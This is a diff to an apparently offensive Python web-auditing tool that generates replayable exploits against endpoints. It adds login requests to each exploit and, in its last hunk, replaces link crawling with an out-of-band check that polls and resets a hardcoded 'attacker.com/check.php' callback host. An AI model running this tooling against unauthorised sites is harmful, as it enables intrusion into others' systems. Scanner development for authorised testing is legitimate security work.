@@ -50,13 +50,13 @@ def prepare_bundles(params, payload):
                 bundle = params.copy()
                 bundle[ka] = payload[0]
                 bundle[kb] = payload[1]
-                bundle = fill(bundle, payload[0])
+                bundle = fill(bundle, payload[1])
                 bundles.append(bundle)
 
                 bundle = params.copy()
                 bundle[kb] = payload[0]
                 bundle[ka] = payload[1]
-                bundle = fill(bundle, payload[0])
+                bundle = fill(bundle, payload[1])
                 bundles.append(bundle)
 
     return bundles
@@ -100,13 +100,17 @@ class auditor(JSONPipe):
         for endpoint in incomings[0]:
 
             if 'seed' in endpoint and endpoint['seed'] >= 0:
-                self.login(endpoint)
+                auth = self.login(endpoint)
+            else:
+                auth = None
 
             for payload in incomings[1]:
                 exploitable, exploit = self.exploit(endpoint, payload)
 
                 if exploitable:
                     counter += 1
+                    if auth:
+                        exploit = [auth] + exploit
                     exploits.append({
                         'name': 'exploit-' + str(counter),
                         'exploit': exploit
@@ -128,6 +132,7 @@ class auditor(JSONPipe):
         else:
             return
 
+        params = self.seeds[seed]['auth']['params'].copy()
         auth = self.seeds[seed]['auth']
 
         if auth:
@@ -144,6 +149,12 @@ class auditor(JSONPipe):
             if 'token' in auth:
                 self.session[seed]['token'] = parse_token(r.request.url, auth['token'])
             self.session[seed]['login'] = True
+
+            return {
+                'url': auth['url'],
+                'formFields': params,
+                'fileFields': None
+            }
 
     def exploit(self, endpoint, payload):
         exploit = []
@@ -165,7 +176,7 @@ class auditor(JSONPipe):
             if endpoint['files'] and key in endpoint['files']:
                 files[key] = open(self.filePath, 'rb')
 
-        if session['token']:
+        if session and 'token' in session and session['token']:
             for k in session['token']:
                 target += "&" + k + "=" + session['token'][k]
         print method, ": ", target
@@ -227,6 +238,17 @@ class auditor(JSONPipe):
         if self.see_root(response.text):
             return True, exploit
         else:
+            r = self.http.get("http://attacker.com/check.php")
+            link = r.text
+            if not r.text == 'CLEAN':
+                exploit.append({
+                    'url': link,
+                    'formFields': None,
+                    'fileFields': None
+                })
+                self.http.get("http://attacker.com/check.php?clean=true")
+                return True, exploit
+            """
             links = self.find_links(response.text, referer)
 
             for link in links:
@@ -240,6 +262,7 @@ class auditor(JSONPipe):
                         'formFields': None
                     })
                     return True, exploit
+            """
 
         return False, exploit
 
